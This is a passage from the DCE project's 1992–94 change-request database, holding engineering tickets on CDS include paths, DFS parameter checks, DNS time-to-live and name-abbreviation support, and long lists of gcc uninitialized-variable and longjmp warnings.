revisited.  Perhaps much of what's hanging around now really belongs in
PMAX target subdirectories, or otherwise conditioned on ${TARGET_MACHINE}
being PMAX.

[05/27/92 public]
This will be considered for DCE 1.0.2.

[1/11/93 public]
This is part of the DCE1.1 code cleanup project.

[5/27/93 public]
Scheduled for 1.0.3.

[12/23/93 public]
Removed cjd as assignee.  This defect is still very valid.

[7/1/94 sally]
Lowered the Severity - This bug has been here since 4/4/92 it would
appear that there is a workaround.



CR Number                     : 2494
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : 
Short Description             : cleanup of include paths
Reported Date                 : 4/1/92
Found in Baseline             : 1.0.1
Found Date                    : 4/1/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : many
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/1/92 public]

Many routines in CDS include <cds_filexxx.h> instead of
<dce/cds_filexxx.h>.

This all works today because many of the CDS include files are
resolved in the object tree, even though they are correctly
exported.

Note: This problem raised its head when building
test/directory/cds/cdstest.c.  When building this program, there is the
assumption that obj/pmax/directory/cds/... exists.  It doesn't
necessarily.

A quick and dirty fix was put into the Makefile for cdstest.c.



CR Number                     : 2369
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Invalid param checks in fixed_anode.c
Reported Date                 : 3/23/92
Found in Baseline             : 1.0.1
Found Date                    : 3/23/92
Severity                      : D
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : anode/fixed_anode.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Status               : open
Transarc Herder               : jdp@transarc.com

[3/23/92 public]

There are a large number of invalid parameter checks in various functions
in fixed_anode.c which should be assertions; these were found while doing
branch coverage analysis.

[4/6/92 public]
Updated transarc status field.

[4/22/92 public]
Here is the text from the Transarc DB.

Date: Fri, 20 Mar 1992 16:49:02 -0500 (EST)
From: Bruce_Leverett@transarc.com
To: DFS_Bugs_Mailing-List@transarc.com
Subject: new bug

The following invalid parameter checks in functions in episode/fixed_anode.c
should be assertions.  The line numbers refer to version 2.8, so beware.

611    1331   1517   1828   2083   3155   3490   3639
647    1356   1543   1830   2136   3289   3524   3642
652    1357   1556   1832   2380   3291   3525
675    1358   1605   1836   2383   3347   3529
699    1414   1625   1838   2405   3348   3532
1073   1416   1650   1841   3145   3412   3546
1075   1475   1820   1849   3146   3437   3582
1283   1514   1822   1850   3147   3487   3585
1330   1516   1826   1930   3149   3488   3623
Added field Transarc Herder with value `'

[7/9/92 public]
Changed Defect or Enhancement? from `def' to `enh' 
Changed H/W Ref Platform from `pmax' to `all' 
Changed S/W Ref Platform from `osf1' to `all' 
Filled in Affected File with `anode/fixed_anode.c' 
Filled in Reported by Company's Ref. Number with `2635' 
Filled in Transarc Herder with `jdp@transarc.com'

[7/20/92 public]
Changed "Fix by" to 1.0.2



CR Number                     : 2294
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : 
Short Description             : No time-to-live value from CDS
Reported Date                 : 3/13/92
Found in Baseline             : 1.0
Found Date                    : 3/13/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[3/13/92 public]

The DFS cache manager caches information that it learns from CDS--directory
structure and junction attributes.  (Basically, it builds a micro-filesystem
that describes the tree structure immediately under the /.../ root.)
However, as CDS and cell configuration information changes over time, DFS
has no way of knowing when to re-check its cached information.

The Internet's domain name system does have a mechanism for expressing
time-to-live attributes of the information that resides there.
Administrators set time-to-live values both on specific pieces of
information and on the zone as a whole; these are used as time-to-live
values for explicit information records and the authoritative absence of
informmation records, respectively.  Before making a change to
configuration information in the Internet DNS, administrators can reduce the
time-to-live values for information that is about to change.

The DFS cache manager (and possibly other CDS clients as well) would
benefit if CDS were to offer time-to-live values for the information that
it returns.  With such information, the DFS cache manager would know when
to revalidate its cache.  At the moment, it (really the ``dfsbind''
program) must simply guess as to the proper TTL values to use.  Minimally,
it would be useful for CDS to propagate TTL values from the domain system
to the CDS client, both for successful and for failed lookups.

[3/23/92 public]

Referring to Sec. 3.6.1.2 in "Using the Portable Interface to the CDS Clerk",
the fsCacheTimeout flag may be used to specify a value in seconds to limit
the age of cached data returned to an application. This will only be
effective if you let the CDS clerk cache CDS data for you. Unfortunately
returning a TTL from a CDS or a DNS server will require a protocol change --
highly unlikely for DCE 1.0.*.

[4/13/92 public]
Changed to enhancement.

[weisman 4/28/92 public] 

For some reason, the change on 4/13 to enhancement didn't happen.  Try
again...



CR Number                     : 2204
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : bind
Short Description             : bind gda cannot expand abbrevs
Reported Date                 : 3/11/92
Found in Baseline             : 1.0
Found Date                    : 3/11/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : 
Transarc Status               : 

[3/11/92 public]
 
Ideally, in a cell registered in the Domain Name System, a user could refer
to an object by giving a nickname or an abbreviation after the /.../ name
component.  That is, a user should not be constrained to type canonical
fully-qualified domain names after /.../, but might type some abbreviation
that the domain resolver normally recognizes, or might type a name that is
a nickname (CNAME) for a formal cell name.
 
If this functionality were present in CDS, the dfsbind program of dfs would
like to be able to use it.  In particular, it would be most useful for
dfsbind (a CDS client) to be able to distinguish canonicalized names from
abbreviations or CNAMEs.  (The representation of abbreviations or CNAMEs
in the file system would be as symbolic links to the canonicalized name.)
In order for this functionality to work, dfsbind would have to be able to
tell whether the name presented by a user were already canonicalized, or if
not, what the canonicalized form of the name was.

[6/4/93 public]
Could we call this a defect rather than an enhancement for 1.1?  Seems like
a practical necessity.
(as a separate issue, dfsbind will need to be able to read CDS aliases)
Changed Defect or Enhancement? from `enh' to `def' 
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `'

[07/07/93 public]
I'll check on wether this can/should be done for 1.1. It's not going
to happen during 1.0.3 so to keep our defect bookkeeping straight it
should be carried as an enhancement request for 1.1.



CR Number                     : 2114
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : 
Short Description             : cds uninialized variable warnings
Reported Date                 : 2/19/92
Found in Baseline             : 1.0.1
Found Date                    : 2/19/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/19/92 public]
The following warnings were generated with gcc -W -O and may indicate
problems with possible local variable use before being initialized.

/project/dce/build/dce1.0.1/src/directory/cds/adver/adver_clerk_event.c:1393: warning: `prevChild' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/adver/adver_sysdep_unix.c:1292: warning: `spt' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/adver/adver_sysdep_unix.c:185: warning: `sockptr' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/adver/adver_sysdep_unix.c:328: warning: `sockptr' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cache/PMAX/casysinfo.c:154: warning: `fd' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cache/caload.c:316: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cache/caname.c:144: warning: `name_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cache/caname.c:190: warning: `name_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display.c:218: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display.c:253: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display.c:305: warning: `count' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display_outline.c:120: warning: `i' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display_outline.c:2858: warning: `num_path' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display_outline.c:3151: warning: `clr_x' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display_outline.c:3151: warning: `dst_x' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display_outline.c:3151: warning: `src_x' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display_outline.c:3152: warning: `clr_wid' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display_outline.c:3318: warning: `clr_x' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display_outline.c:3318: warning: `dst_x' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display_outline.c:3318: warning: `src_x' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display_outline.c:3319: warning: `clr_wid' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display_outline.c:3753: warning: `entry' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display_outline.c:4146: warning: `maxim' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display_outline.c:4146: warning: `minim' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display_outline.c:4146: warning: `shown' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_display_outline.c:4146: warning: `value' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/cds_structure.c:1584: warning: `current_number' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/pane.c:1732: warning: `subdata' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/pane.c:2085: warning: `lastsharedposition' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/pane.c:2749: warning: `cursubdata' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/pane.c:2750: warning: `cursubwidget' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/cdsbrowser/pane.c:529: warning: `which' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/child/clerk_find_ch.c:82: warning: `set_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/child/clerk_init_cle.c:227: warning: `end_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/child/clerk_tree_walk.c:120: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/child/clerkcreatedirectory.c:201: warning: `sm_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/child/clerkreadattribute.c:509: warning: `out_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/dnscp_credir.c:533: warning: `master_ch' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/emit_ref_hdr.c:171: warning: `hp' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/emit_tower_lines.c:50: warning: `status2' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/format_tower.c:154: warning: `id' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/format_utcabs_for_print.c:54: warning: `len' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/get_command.c:128: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/get_command.c:132: warning: `oldhandler' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/move_squeeze_name.c:47: warning: `endp' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/msgfnd.c:142: warning: `key_end' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/msgget.c:215: warning: `key_end' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/msgget.c:221: warning: `found' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/op_list.c:803: warning: `emit_line_status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/startup_file.c:58: warning: `spec' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/visit_cds.c:355: warning: `attrcode' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/visit_cds.c:733: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/control/visit_cds.c:741: warning: `kindofenum' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_bind.c:1447: warning: `type' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_bind.c:2598: warning: `cp' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_bind.c:2605: warning: `n' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_bind.c:2606: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_bind.c:2608: warning: `anslen' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_bind.c:2831: warning: `answ' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_bind.c:2842: warning: `num_memslots' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_bind.c:2843: warning: `curr_memslot' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_bind.c:437: warning: `rr_head' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_bind.c:440: warning: `class' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_bind.c:442: warning: `dlen' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_bind.c:820: warning: `looper' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_clerk.c:247: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_list.c:1423: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_list.c:176: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_rpcint.c:1334: warning: `answ' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_rpcint.c:1371: warning: `answ' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_rpcint.c:1440: warning: `answ' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_rpcint.c:1513: warning: `answ' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_rpcint.c:1545: warning: `answ' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/gda/gda_update_parent.c:143: warning: `rp_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/cdsstrtosimple.c:117: warning: `attr' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnscvtobjid.c:835: warning: `p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsgather.c:83: warning: `end_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnshandleattrmbr.c:153: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsmalloc.c:414: warning: `fragment_count' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsmalloc.c:415: warning: `fragment_total' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsmalloc.c:615: warning: `sc_list' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsmalloc.c:618: warning: `sc_element_size' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsmalloc.c:619: warning: `sc_allocation' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsmalloc.c:721: warning: `element_size' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsnewepoch.c:149: warning: `ucp_setd' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsnewepoch.c:149: warning: `ucp_seto' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsnewepoch.c:165: warning: `ucp_setd' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsnewepoch.c:165: warning: `ucp_seto' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsread.c:781: warning: `Flags_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsread.c:782: warning: `addr_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsread.c:783: warning: `resp_cnt' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsresolvename.c:66: warning: `orname' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsresolvename.c:68: warning: `orlen' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsscatter.c:147: warning: `fsnm_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/tower_lib.c:280: warning: `found' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/triggers_lib.c:184: warning: `curr_trigger' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/triggers_lib.c:426: warning: `dtype' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/triggers_lib.c:428: warning: `fire_limit' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/triggers_lib.c:429: warning: `fire_delay' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/library/triggers_lib.c:430: warning: `fire_probability' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/back_collect.c:247: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/back_copy_updates.c:157: warning: `element_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/back_copy_updates.c:294: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/back_parentpointer.c:326: warning: `member_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/back_replicas.c:164: warning: `towerset_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/back_skulk.c:1079: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/back_skulk.c:494: warning: `ts_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/back_spread.c:130: warning: `replica_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/back_spread.c:133: warning: `replica_len' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/cds_dacl.c:1052: warning: `index' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/cds_dacl.c:929: warning: `index' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/db_btree.c:1187: warning: `split1_size' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/db_btree.c:1563: warning: `newbkt_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/db_common.c:1133: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/db_common.c:1388: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/db_common.c:1451: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/db_compression.c:543: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/db_tlog.c:375: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/dns_service_ncl.c:376: warning: `set_member_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/dump_files.c:123: warning: `sequence_number' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/names_lib.c:562: warning: `bits' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/sets_lib.c:903: warning: `value_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/ta_adver.c:434: warning: `alt_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/ta_create.c:1755: warning: `parent_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/ta_create.c:2004: warning: `update_p' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/ta_epoch.c:131: warning: `status' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/ta_lookup.c:281: warning: `allowed' may be used uninitialized in this function
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_net.c:1377: warning: `set_p' may be used uninitialized in this function

[3/19/92 public]
Digital is working on this bug now.

[4/13/92 public]
Changed to enhancement.



CR Number                     : 2112
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : 
Short Description             : cds compilation warnings
Reported Date                 : 2/19/92
Found in Baseline             : 1.0.1
Found Date                    : 2/19/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/19/92 public]
Warnings produced by gcc -W -O that may indicate problems with variables
and longjmps.  These may be benign but should be looked at.

/project/dce/build/dce1.0.1/src/directory/cds/child/clerk_client.c:364: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/child/clerk_client.c:384: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/child/clerk_listener.c:193: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/control/get_command.c:128: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/control/get_command.c:130: warning: variable `prompt' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/control/get_command.c:131: warning: variable `trying' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsread.c:1104: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsread.c:672: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsread.c:677: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsread.c:713: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsread.c:781: warning: variable `Flags_p' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsread.c:782: warning: variable `addr_p' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsread.c:783: warning: variable `resp_cnt' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsread.c:785: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/library/dnsread.c:805: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/library/dnssend.c:244: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/back_ground.c:1179: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:1003: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:1010: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:1094: warning: variable `chName_p' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:1097: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:1105: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:1143: warning: variable `chName_p' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:1146: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:1166: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:1266: warning: variable `chName_p' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:1269: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:1276: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:1319: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:1330: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:434: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:439: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:477: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:484: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:530: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:538: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:576: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:581: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:607: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:612: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:640: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:645: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:685: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:692: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:769: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:776: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:843: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:850: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:895: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:908: warning: variable `_XXX_completed' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:955: warning: variable `status' may be clobbered by `longjmp'
/project/dce/build/dce1.0.1/src/directory/cds/server/unix_stubs.c:963: warning: variable `_XXX_completed' may be clobbered by `longjmp'

[3/19/92 public]
Digital is working on this bug now.

[4/13/92 public]
changed to enhancement



CR Number                     : 2103
